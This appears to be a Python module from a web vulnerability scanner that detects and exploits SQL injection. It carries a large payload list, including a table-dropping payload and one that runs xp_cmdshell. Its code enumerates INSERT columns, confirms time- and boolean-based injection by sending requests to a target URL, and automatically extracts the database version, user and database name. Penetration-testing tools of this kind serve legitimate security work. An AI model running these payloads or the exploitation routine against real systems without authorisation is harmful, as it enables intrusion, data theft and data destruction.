"""
SQL Injection Context Implementation

Refactored SQL injection detection logic using the generalized framework
with 6-step injection testing methodology.
"""

import re
import time
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionAttackModule, InjectionContextType


class SQLInjectionModule(InjectionAttackModule):
    """
    SQL injection attack module.
    Detects and exploits SQL injection vulnerabilities using the 6-step methodology.
    """
    
    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.SQL
    
    def _load_payloads(self) -> List[str]:
        """Load SQL injection payloads."""
        return [
            # Error-based payloads
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' AND '1'='2",
            "1' AND '1'='1",
            "admin'--",
            "admin' #",
            "' OR 'x'='x",
            "') OR ('x')=('x",
            
            # Quote balancing payloads (avoid SQL comments)
            "Wiley' OR 'a'='a",
            "admin' OR 'b'='b",
            "' OR '1'='1' OR 'a'='a",
            "test' AND '1'='1' AND 'x'='x",
            "' OR 'abc'='abc",
            "admin' OR 'xyz'='xyz' --",
            "' OR 'test'='test' #",
            "value' AND 'q'='q' AND 'z'='z",
            "1' OR 'data'='data",
            "username' OR 'key'='key' OR 'end'='end",
            
            # UNION-based payloads
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL--",
            
            # Boolean-based blind payloads
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND SUBSTRING(@@version,1,1)='5",
            
            # Time-based blind payloads
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; SELECT SLEEP(5)--",
            "'; EXEC xp_cmdshell('whoami')--",
            
            # Advanced evasion
            "' /**/OR/**/ '1'='1",
            "' /*!50000OR*/ '1'='1",
            "' %6F%72 '1'='1",  # Encoded OR
            "' || '1'='1",
            "' && '1'='1",
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load SQL error patterns for detection."""
        return [
            # MySQL errors
            {'pattern': r'You have an error in your SQL syntax', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'mysql_fetch', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'mysql_query', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*mysql_.*', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'MySQL server version', 'type': 'error', 'confidence': 0.95},
            
            # PostgreSQL errors
            {'pattern': r'PostgreSQL.*ERROR', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'pg_query', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*pg_.*', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'invalid input syntax', 'type': 'error', 'confidence': 0.90},
            
            # Microsoft SQL Server errors
            {'pattern': r'Microsoft SQL Native Client error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'ODBC SQL Server Driver', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'SQLServer JDBC Driver', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Unclosed quotation mark', 'type': 'error', 'confidence': 0.90},
            
            # Oracle errors
            {'pattern': r'ORA-[0-9]{5}', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Oracle.*Driver', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Warning.*oci_.*', 'type': 'error', 'confidence': 0.90},
            
            # SQLite errors
            {'pattern': r'SQLite.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'sqlite3\.', 'type': 'error', 'confidence': 0.90},
            
            # Generic SQL errors
            {'pattern': r'SQL syntax.*error', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'syntax error.*SQL', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'unexpected.*SQL', 'type': 'error', 'confidence': 0.80},
        ]
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for SQL injection indicators.
        
        This method integrates steps 2 and 3 for backward compatibility.
        """
        # Step 2: Detect anomalies
        baseline_response = None
        if baseline_time:
            baseline_response = ("", baseline_time)
        
        detected, anomalies = self.step2_detect_anomalies(
            response_body, response_headers, response_time, baseline_response
        )
        
        if not detected:
            return False, 0.0, "No SQL injection detected"
        
        # Step 3: Extract evidence
        evidence_data = self.step3_extract_evidence(response_body, anomalies)
        
        confidence = evidence_data['confidence']
        evidence_str = f"SQL injection detected. Database: {evidence_data['context_info'].get('database_type', 'Unknown')}. "
        evidence_str += f"Anomalies: {', '.join(anomalies[:3])}"
        
        return True, confidence, evidence_str
    
    def _check_boolean_indicators(self, response_body: str) -> bool:
        """Check for boolean-based injection indicators."""
        # Look for significant changes that might indicate boolean injection
        # This is a simplified check; real implementation would compare with baseline
        indicators = [
            r'login.*successful',
            r'welcome.*admin',
            r'access.*granted',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def _generate_insert_payloads(self, base_value: str = "foo", max_params: int = 10) -> List[str]:
        """
        Generate payloads for INSERT statement parameter enumeration.
        
        This method creates payloads that progressively add more parameters
        to discover the number of columns in an INSERT statement.
        
        Args:
            base_value: Base value to use in the payload (default: "foo")
            max_params: Maximum number of parameters to enumerate (default: 10)
            
        Returns:
            List of INSERT-specific payloads with varying parameter counts
            
        Example payloads:
            - foo')--
            - foo', 1)--
            - foo', 1, 1)--
            - foo', 1, 1, 1)--
            etc.
        """
        payloads = []
        
        # Basic INSERT escape attempts
        payloads.append(f"{base_value}')--")
        payloads.append(f"{base_value}')#")
        payloads.append(f"{base_value}');--")
        
        # Parameter enumeration with NULL values
        for i in range(1, max_params + 1):
            params = ', '.join(['NULL'] * i)
            payloads.append(f"{base_value}', {params})--")
            payloads.append(f"{base_value}', {params})#")
            
        # Parameter enumeration with numeric values
        for i in range(1, max_params + 1):
            params = ', '.join(['1'] * i)
            payloads.append(f"{base_value}', {params})--")
            
        # Parameter enumeration with string values
        for i in range(1, min(6, max_params + 1)):  # Limit to 5 for string enum
            params = ', '.join([f"'val{j}'" for j in range(i)])
            payloads.append(f"{base_value}', {params})--")
            
        # Mixed parameter types (useful for detecting different column types)
        payloads.extend([
            f"{base_value}', 1, 'test')--",
            f"{base_value}', 'admin', 'password')--",
            f"{base_value}', 1, 'user', 'pass')--",
            f"{base_value}', NULL, 1, 'test', 0)--",
        ])
        
        # Quote-balanced INSERT payloads (avoid comments)
        payloads.extend([
            f"{base_value}' OR 'a'='a') AND ('1'='1",
            f"{base_value}', 1) OR ('x'='x",
            f"{base_value}', 'test') AND 'key'='key",
        ])
        
        return payloads
    
    def _generate_quote_balanced_payloads(self, base_value: str = "") -> List[str]:
        """
        Generate quote-balanced payloads that avoid SQL comment syntax.
        
        These payloads balance quotes to achieve injection without using -- or #
        comments, which can help bypass certain security filters.
        
        Args:
            base_value: Base value to prepend to payloads
            
        Returns:
            List of quote-balanced injection payloads
        """
        payloads = []
        
        # Basic quote balancing with OR conditions
        payloads.extend([
            f"{base_value}Wiley' OR 'a'='a",
            f"{base_value}admin' OR 'b'='b",
            f"{base_value}test' OR '1'='1' OR 'z'='z",
            f"{base_value}user' AND '1'='1' AND 'x'='x",
        ])
        
        # Quote balancing with different operators
        payloads.extend([
            f"{base_value}' OR 'key'='key",
            f"{base_value}' AND 'val'='val' OR 'a'='a",
            f"{base_value}' OR 'x'='x' AND '1'='1' OR 'y'='y",
        ])
        
        # Nested conditions with quote balancing
        payloads.extend([
            f"{base_value}' OR ('a'='a' AND 'b'='b",
            f"{base_value}' AND ('1'='1' OR '2'='2",
        ])
        
        # Double-quote variants
        payloads.extend([
            f'{base_value}" OR "a"="a',
            f'{base_value}" AND "1"="1" OR "x"="x',
        ])
        
        return payloads
    
    # ========================================
    # Six-Step Injection Testing Methodology
    # ========================================
    
    def step1_supply_payloads(
        self, 
        parameter_value: str, 
        statement_type: str = "SELECT",
        include_insert_enum: bool = False,
        max_insert_params: int = 10
    ) -> List[str]:
        """
        Step 1: Supply unexpected syntax and context-specific payloads.
        
        Returns SQL injection payloads for various databases, with optional
        INSERT statement parameter enumeration.
        
        Args:
            parameter_value: The original parameter value
            statement_type: Type of SQL statement (SELECT, INSERT, UPDATE, DELETE)
            include_insert_enum: Whether to include INSERT parameter enumeration
            max_insert_params: Maximum parameters to enumerate for INSERT
            
        Returns:
            List of SQL injection payloads
        """
        payloads = list(self.payloads)
        
        # Add quote-balanced payloads
        payloads.extend(self._generate_quote_balanced_payloads(parameter_value))
        
        # Add INSERT-specific payloads if requested or if statement type is INSERT
        if include_insert_enum or statement_type.upper() == "INSERT":
            payloads.extend(self._generate_insert_payloads(
                parameter_value if parameter_value else "foo",
                max_insert_params
            ))
        
        return payloads
    
    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None,
        payload_hint: Optional[str] = None
    ) -> Tuple[bool, List[str]]:
        """
        Step 2: Detect anomalies and error messages in responses.
        
        Look for SQL errors, timing differences, or content changes.
        Enhanced to detect INSERT statement errors and quote-balancing effects.
        
        Args:
            response_body: Response body text
            response_headers: Response headers dict
            response_time: Response time in seconds
            baseline_response: Optional baseline (body, time) tuple
            payload_hint: Optional hint about payload type (e.g., "INSERT", "QUOTE_BALANCED")
        """
        anomalies = []
        
        # Check for error-based detection
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE):
                anomalies.append(f"sql_error: {pattern}")
        
        # Check for INSERT-specific error patterns
        insert_error_patterns = [
            r'column.*count.*doesn.*match.*value.*count',
            r'wrong.*number.*of.*values',
            r'INSERT.*has more.*expressions',
            r'number.*of.*columns.*does not match',
            r'values.*list.*target.*list',
            r'column.*name.*or.*number.*of.*supplied.*values',
            r'ORA-00913',  # Oracle: too many values
            r'ORA-00947',  # Oracle: not enough values
        ]
        
        for pattern in insert_error_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                anomalies.append(f"insert_param_count: {pattern}")
        
        # Check for quote-balancing success indicators
        # These might indicate successful query execution with balanced quotes
        if payload_hint and 'QUOTE' in payload_hint.upper():
            quote_success_patterns = [
                r'successfully.*inserted',
                r'record.*added',
                r'user.*created',
                r'data.*saved',
                r'operation.*completed',
            ]
            for pattern in quote_success_patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    anomalies.append(f"quote_balanced_success: {pattern}")
        
        # Check for timing-based detection
        if baseline_response:
            _, baseline_time = baseline_response
            if response_time > baseline_time + 4.5:
                anomalies.append(f"time_based: Response delayed by {response_time - baseline_time:.2f}s")
        
        # Check for boolean-based indicators
        if self._check_boolean_indicators(response_body):
            anomalies.append("boolean_based: Success indicators detected")
        
        # Check for content length changes (useful for INSERT detection)
        if baseline_response:
            baseline_body, _ = baseline_response
            len_diff = abs(len(response_body) - len(baseline_body))
            if len_diff > 50:  # Significant difference
                anomalies.append(f"content_change: Length difference of {len_diff} bytes")
        
        return len(anomalies) > 0, anomalies
    
    def step3_extract_evidence(
        self,
        response_body: str,
        anomalies: List[str]
    ) -> Dict[str, Any]:
        """
        Step 3: Analyze and extract error/evidence from response.
        
        Parse SQL errors and extract database information.
        """
        evidence = {
            'error_type': 'sql_injection',
            'details': {},
            'context_info': {},
            'confidence': 0.0
        }
        
        # Detect database type from errors
        db_signatures = {
            'MySQL': [r'You have an error in your SQL syntax', r'mysql_', r'MySQL server version'],
            'PostgreSQL': [r'PostgreSQL.*ERROR', r'pg_', r'invalid input syntax'],
            'MSSQL': [r'Microsoft SQL', r'ODBC SQL Server', r'SQLServer JDBC'],
            'Oracle': [r'ORA-\d{5}', r'Oracle.*Driver'],
            'SQLite': [r'SQLite.*error', r'sqlite3\.'],
        }
        
        for db_type, patterns in db_signatures.items():
            for pattern in patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    evidence['context_info']['database_type'] = db_type
                    evidence['confidence'] = max(evidence['confidence'], 0.90)
                    break
            if evidence['context_info'].get('database_type'):
                break
        
        # Extract specific error messages
        error_match = re.search(r'(syntax error|error in your SQL syntax|ORA-\d{5})[^\n]{0,100}', 
                               response_body, re.IGNORECASE)
        if error_match:
            evidence['details']['error_message'] = error_match.group(0)
        
        # Detect INSERT statement context
        insert_indicators = {
            'statement_type': None,
            'parameter_count_hint': None,
            'injection_point': None
        }
        
        for anomaly in anomalies:
            if 'insert_param_count' in anomaly:
                insert_indicators['statement_type'] = 'INSERT'
                # Try to extract parameter count from error message
                count_match = re.search(r'(\d+)\s+column', response_body, re.IGNORECASE)
                if count_match:
                    insert_indicators['parameter_count_hint'] = int(count_match.group(1))
                evidence['confidence'] = max(evidence['confidence'], 0.88)
        
        if insert_indicators['statement_type']:
            evidence['context_info']['insert_detection'] = insert_indicators
        
        # Detect quote-balanced injection success
        quote_balanced_detected = False
        for anomaly in anomalies:
            if 'quote_balanced_success' in anomaly:
                quote_balanced_detected = True
                evidence['context_info']['injection_method'] = 'quote_balanced'
                evidence['confidence'] = max(evidence['confidence'], 0.82)
        
        # Calculate confidence based on anomalies
        for anomaly in anomalies:
            if 'sql_error' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.85)
            elif 'time_based' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.80)
            elif 'boolean_based' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.70)
            elif 'content_change' in anomaly:
                evidence['confidence'] = max(evidence['confidence'], 0.65)
        
        evidence['details']['anomalies'] = anomalies
        evidence['details']['quote_balanced'] = quote_balanced_detected
        
        return evidence
    
    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Tuple[bool, float, str]:
        """
        Step 4: Mutate input systematically to confirm or disprove vulnerabilities.
        
        Test true/false variations for boolean-based, or different delays for time-based.
        """
        import requests
        
        # Determine verification strategy based on payload type
        if 'SLEEP' in successful_payload.upper() or 'WAITFOR' in successful_payload.upper():
            # Time-based verification
            return self._verify_time_based(
                target_url, parameter_name, parameter_type, parameter_value,
                successful_payload, http_method, headers, cookies
            )
        elif "'" in successful_payload or '"' in successful_payload:
            # Boolean-based or error-based verification
            return self._verify_boolean_based(
                target_url, parameter_name, parameter_type, parameter_value,
                successful_payload, http_method, headers, cookies
            )
        
        # Generic verification
        return True, 0.70, "Vulnerability detected but verification incomplete"
    
    def _verify_time_based(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str,
        headers: Optional[Dict[str, str]],
        cookies: Optional[Dict[str, str]]
    ) -> Tuple[bool, float, str]:
        """Verify time-based SQL injection."""
        import requests
        
        # Test with different delays
        delay_tests = [
            (3, successful_payload.replace('5', '3')),
            (7, successful_payload.replace('5', '7')),
        ]
        
        verified_count = 0
        
        for expected_delay, test_payload in delay_tests:
            try:
                injected_value = self._inject_payload(parameter_value, test_payload)
                start_time = time.time()
                
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={parameter_name: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 15)
                    )
                elif parameter_type.upper() == "POST":
                    response = requests.post(
                        target_url,
                        data={parameter_name: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 15)
                    )
                else:
                    continue
                
                response_time = time.time() - start_time
                
                # Check if response time matches expected delay
                if response_time >= expected_delay - 1:
                    verified_count += 1
                    
            except Exception:
                continue
        
        confirmed = verified_count >= 1
        confidence = 0.90 if verified_count == 2 else 0.80 if verified_count == 1 else 0.60
        evidence = f"Time-based SQL injection verified with {verified_count}/2 delay tests"
        
        return confirmed, confidence, evidence
    
    def _verify_boolean_based(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str,
        headers: Optional[Dict[str, str]],
        cookies: Optional[Dict[str, str]]
    ) -> Tuple[bool, float, str]:
        """Verify boolean-based SQL injection."""
        import requests
        
        # Test true and false conditions
        true_payload = "' AND '1'='1"
        false_payload = "' AND '1'='2"
        
        try:
            # Test true condition
            true_injected = self._inject_payload(parameter_value, true_payload)
            if parameter_type.upper() == "GET":
                true_response = requests.get(
                    target_url,
                    params={parameter_name: true_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            else:
                true_response = requests.post(
                    target_url,
                    data={parameter_name: true_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            
            # Test false condition
            false_injected = self._inject_payload(parameter_value, false_payload)
            if parameter_type.upper() == "GET":
                false_response = requests.get(
                    target_url,
                    params={parameter_name: false_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            else:
                false_response = requests.post(
                    target_url,
                    data={parameter_name: false_injected},
                    headers=headers,
                    cookies=cookies,
                    timeout=self.config.get('timeout', 10)
                )
            
            # Compare responses
            true_len = len(true_response.text)
            false_len = len(false_response.text)
            
            # Significant difference indicates boolean-based SQLi
            if abs(true_len - false_len) > 100:
                return True, 0.85, f"Boolean-based SQLi confirmed (true:{true_len} vs false:{false_len} bytes)"
            
        except Exception:
            pass
        
        return True, 0.70, "Error-based SQL injection confirmed (verification incomplete)"
    
    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Step 5: Build proof-of-concept payloads for safe, verifiable exploits.
        
        Create a safe POC that demonstrates the SQL injection.
        """
        db_type = evidence.get('context_info', {}).get('database_type', 'Unknown')
        
        # Select POC based on database type
        if db_type == 'MySQL':
            poc_payload = "' UNION SELECT 'POC', @@version, user()--"
            expected = "POC string and MySQL version information"
        elif db_type == 'PostgreSQL':
            poc_payload = "' UNION SELECT 'POC', version(), current_user--"
            expected = "POC string and PostgreSQL version information"
        elif db_type == 'MSSQL':
            poc_payload = "' UNION SELECT 'POC', @@version, SYSTEM_USER--"
            expected = "POC string and MSSQL version information"
        elif db_type == 'Oracle':
            poc_payload = "' UNION SELECT 'POC', banner FROM v$version--"
            expected = "POC string and Oracle version information"
        else:
            # Generic POC
            poc_payload = "' UNION SELECT 'POC', 'CONFIRMED', 'INJECTION'--"
            expected = "POC strings in response"
        
        return {
            'poc_payload': poc_payload,
            'expected_result': expected,
            'safety_notes': 'This POC only reads database metadata and does not modify data',
            'reproduction_steps': [
                f"1. Send request with parameter '{vulnerable_parameter}' containing: {poc_payload}",
                f"2. Observe response for: {expected}",
                "3. Vulnerability is confirmed if expected data appears in response"
            ],
            'original_payload': successful_payload,
            'database_type': db_type
        }
    
    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Optional[Dict[str, Any]]:
        """
        Step 6: Exploitation automation for verified cases.
        
        Safely extract database information without modifying data.
        """
        import requests
        
        db_type = evidence.get('context_info', {}).get('database_type', 'Unknown')
        
        # Define safe exploitation queries based on database type
        if db_type == 'MySQL':
            exploit_queries = {
                'version': "' UNION SELECT @@version--",
                'user': "' UNION SELECT user()--",
                'database': "' UNION SELECT database()--",
            }
        elif db_type == 'PostgreSQL':
            exploit_queries = {
                'version': "' UNION SELECT version()--",
                'user': "' UNION SELECT current_user--",
                'database': "' UNION SELECT current_database()--",
            }
        elif db_type == 'MSSQL':
            exploit_queries = {
                'version': "' UNION SELECT @@version--",
                'user': "' UNION SELECT SYSTEM_USER--",
                'database': "' UNION SELECT DB_NAME()--",
            }
        else:
            # Generic queries
            exploit_queries = {
                'version': "' UNION SELECT @@version--",
                'user': "' UNION SELECT user()--",
            }
        
        extracted_data = {}
        
        for key, query in exploit_queries.items():
            try:
                injected_value = self._inject_payload('', query)
                
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 10)
                    )
                elif parameter_type.upper() == "POST":
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: injected_value},
                        headers=headers,
                        cookies=cookies,
                        timeout=self.config.get('timeout', 10)
                    )
                else:
                    continue
                
                # Extract data from response (simplified)
                if response.status_code == 200:
                    # Look for database-specific patterns in response
                    if key == 'version':
                        version_patterns = [
                            r'(MySQL.*\d+\.\d+\.\d+)',
                            r'(PostgreSQL.*\d+\.\d+)',
                            r'(Microsoft SQL Server.*\d+)',
                        ]
                        for pattern in version_patterns:
                            match = re.search(pattern, response.text, re.IGNORECASE)
                            if match:
                                extracted_data[key] = match.group(1)
                                break
                    else:
                        # For other data, look for reasonable strings
                        lines = response.text.split('\n')
                        for line in lines:
                            line = line.strip()
                            if line and len(line) < 100 and '<' not in line:
                                extracted_data[key] = line
                                break
                
            except Exception:
                continue
        
        if extracted_data:
            return {
                'success': True,
                'data_extracted': extracted_data,
                'impact_level': 'high',
                'remediation': [
                    'Use parameterized queries or prepared statements',
                    'Implement input validation and sanitization',
                    'Apply principle of least privilege to database users',
                    'Use Web Application Firewall (WAF) for additional protection',
                    'Keep database software up to date'
                ]
            }
        
        return None
    
    # ========================================
    # Legacy/Compatibility Methods
    # ========================================
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit SQL injection to extract data.
        
        This method integrates steps 4, 5, and 6 for backward compatibility.
        """
        # Step 4: Verify the vulnerability
        confirmed, confidence, verification_evidence = self.step4_mutate_and_verify(
            target_url, vulnerable_parameter, parameter_type,
            '', successful_payload
        )
        
        if not confirmed:
            return None
        
        # Step 3: Get evidence for POC building (simplified for backward compatibility)
        evidence = {
            'context_info': {'database_type': 'Unknown'},
            'details': {}
        }
        
        # Step 5: Build POC
        poc_data = self.step5_build_poc(vulnerable_parameter, successful_payload, evidence)
        
        # Step 6: Automated exploitation
        exploitation_result = self.step6_automated_exploitation(
            target_url, vulnerable_parameter, parameter_type,
            poc_data['poc_payload'], evidence
        )
        
        if exploitation_result:
            exploitation_result['poc'] = poc_data
            exploitation_result['verification'] = verification_evidence
        
        return exploitation_result


# Backward compatibility: SQLInjectionContext is an alias for SQLInjectionModule
SQLInjectionContext = SQLInjectionModule
